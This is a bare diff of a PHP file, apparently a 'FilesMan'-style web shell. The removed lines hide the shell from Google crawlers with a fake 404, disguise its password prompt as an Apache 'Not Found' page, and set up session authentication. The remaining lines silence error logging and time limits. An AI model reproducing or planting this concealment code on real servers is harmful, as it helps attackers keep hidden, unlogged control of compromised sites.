@@ -1,12 +1,4 @@
 <?php
-$auth_pass = "";
-$color = "#00ff00";
-$default_action = 'FilesMan';
-@define('SELF_PATH','__FILE__');
-if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
-header('HTTP/1.0 404 Not Found');
-exit;
-}
 @session_start();
 @error_reporting(0);
 @ini_set('error_log',NULL);
@@ -14,35 +6,6 @@ exit;
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION','2.1');
-if( get_magic_quotes_gpc() ) {
-function stripslashes_array($array) {
-return is_array($array) ?array_map('stripslashes_array',$array) : stripslashes($array);
-}
-$_POST = stripslashes_array($_POST);
-}
-function printLogin() {
-;echo ' 
-<h1>Not Found</h1> 
-<p>The requested URL was not found on this server.</p> 
-<hr> 
-<address>Apache Server at ';echo $_SERVER['HTTP_HOST'];echo ' Port 80</address> 
-    <style> 
-        input { margin:0;background-color:#fff;border:1px solid #fff; } 
-    </style> 
-    <center> 
-    <form method=post> 
-    <input type=password name=pass> 
-    </form></center> 
-    ';
-exit;
-}
-if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
-if( empty( $auth_pass ) ||
-( isset( $_POST['pass'] ) &&( md5($_POST['pass']) == $auth_pass ) ) ) 
-$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-else 
-printLogin();
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
